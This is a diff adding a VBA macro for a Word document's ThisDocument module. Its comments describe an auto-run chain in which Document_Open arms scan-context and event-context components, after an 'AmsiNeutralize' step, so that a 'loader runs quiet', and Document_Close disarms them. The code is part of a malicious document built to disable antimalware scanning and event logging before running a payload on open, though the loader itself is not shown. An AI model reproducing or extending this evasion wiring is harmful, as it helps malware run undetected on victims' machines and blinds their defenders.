@@ -1,0 +1,26 @@
+' Paste this into ThisDocument (double-click it in the Project Explorer).
+' Runs after the scan-interface neutralizer (AmsiNeutralize) so the chain is:
+' Document_Open -> ScanCtx arm -> EvtCtx arm -> loader runs quiet.
+' Document_Close disarms both in reverse order so neither outlives the project.
+
+' For the _Standalone variants:
+Private Sub Document_Open()
+    ScanCtx_Standalone.Arm
+    EvtCtx_Standalone.Arm
+End Sub
+
+Private Sub Document_Close()
+    EvtCtx_Standalone.Disarm
+    ScanCtx_Standalone.Disarm
+End Sub
+
+' For the shared variants (require WinAPI_Core.bas also imported):
+' Private Sub Document_Open()
+'     ScanCtx.Arm
+'     EvtCtx.Arm
+' End Sub
+'
+' Private Sub Document_Close()
+'     EvtCtx.Disarm
+'     ScanCtx.Disarm
+' End Sub
